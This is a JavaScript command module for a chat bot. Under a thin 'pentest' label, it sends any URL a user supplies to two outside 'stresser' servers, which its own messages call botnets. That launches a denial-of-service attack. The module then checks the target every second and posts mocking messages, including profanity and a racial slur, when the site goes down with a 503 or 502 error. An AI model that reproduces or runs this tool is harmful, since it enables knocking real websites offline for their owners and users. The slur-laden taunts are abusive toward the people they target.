const axios = require("axios");

const apiEndpoints = ["http://sgp1.hmvhostings.com:25694", "https://ddos-g01l.onrender.com"];

module.exports.config = {
  name: "dildos",
  type: "pentest",
  role: 0,
  isPrefix: true,
  info:
    "Perform DILDOS ATTACK on a target URL for pentest or testing purposes.",
  author: "Kenneth Panio",
  cd: 10,
  guide: "dildos http://example.com",
  usage: "[url]",
};

module.exports.run = async ({ args, chat, font }) => {
  const targetUrl = args[0];

  if (!targetUrl) {
    return chat.reply(font.thin("Please provide a URL to attack!"));
  }

 
  const tryAttack = async (apis, index = 0) => {
    if (index >= apis.length) {
      return chat.reply(
        font.thin(
          "All BOTNETs are currently busy, try again later after all attacks are finished!"
        )
      );
    }



    try { 

      let response;

      const helonegaownersv2 = targetUrl.toLowerCase() === "stop";

      if (!helonegaownersv2) {
        const preparingMessage = await chat.reply(
          font.bold("Preparing to attack target...")
        );
        response = await axios.get(
          `${apis[index]}/stresser?url=${encodeURIComponent(targetUrl)}`,
          {
            timeout: 10000,
          }
        );
        preparingMessage.delete();
      }

      if (helonegaownersv2) {
        response = await axios.get(
          `${apis[index]}/stop`,
          {
            timeout: 10000,
          }
        );

      }

      await chat.reply(
        font.thin(response.data.message || "Attack initiated successfully!")
      );

      let errorMessageSent = false;
      let attackInterval = null;

      attackInterval = setInterval(async () => {
        if (errorMessageSent) {
          clearInterval(attackInterval);
          return;
        }

        try {
          await axios.get(targetUrl.match(/^(https?:\/\/[^\/]+)/)[0]);
        } catch (error) {
          if (errorMessageSent) {
            clearInterval(attackInterval);
            return;
          }

          errorMessageSent = true;
          clearInterval(attackInterval);

          if (error.response) {
            if (error.response.status === 503) {
              await chat.reply(
                font.thin("Ako importante? putah! dildos saksispuli! Service Unavailable (503).")
              );
            } else if (error.response.status === 502) {
              await chat.reply(
                font.thin(
                  "Kamusta negrong may ari bersyong pangalawa! Bad Gateway (502)."
                )
              );
            }
          }
        }
      }, 1000);
    } catch (error) {
      if (error.code === "ENOTFOUND" || error.code === "ECONNABORTED") {
        return tryAttack(apis, index + 1);
      }
    }
  };

  await tryAttack(apiEndpoints);
};
